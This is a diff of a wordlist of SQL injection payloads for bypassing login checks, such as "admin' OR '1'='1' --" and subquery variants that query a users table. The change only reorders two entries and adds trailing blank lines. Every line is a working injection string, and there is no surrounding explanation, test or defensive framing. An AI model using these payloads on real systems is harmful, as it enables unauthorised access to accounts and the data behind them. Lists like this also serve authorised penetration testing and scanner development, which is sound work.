@@ -1,12 +1,12 @@
 admin' OR '1'='1' --
 admin' OR '1'='1' /*
-' OR '1'='1'--
-' OR '1'='1' /*
 admin' OR '1'='1'--
 admin' OR '1'='1'/*
 admin' OR '1'='1';--
 admin' OR '1'='1'; #
 admin' OR '1'='1'; /*
+' OR '1'='1' /*
+' OR '1'='1'--
 ' OR '1'='1';--
 ' OR '1'='1'; #
 ' OR '1'='1'/*
@@ -28,3 +28,5 @@ admin' OR 1=1/*
 1' OR (SELECT 1 FROM users WHERE username='admin' AND password='wrong') IS NULL--
 1' OR (SELECT 1 WHERE 1=1) IS NOT NULL--
 1' OR (EXISTS (SELECT 1 WHERE 1=1))--
+
+
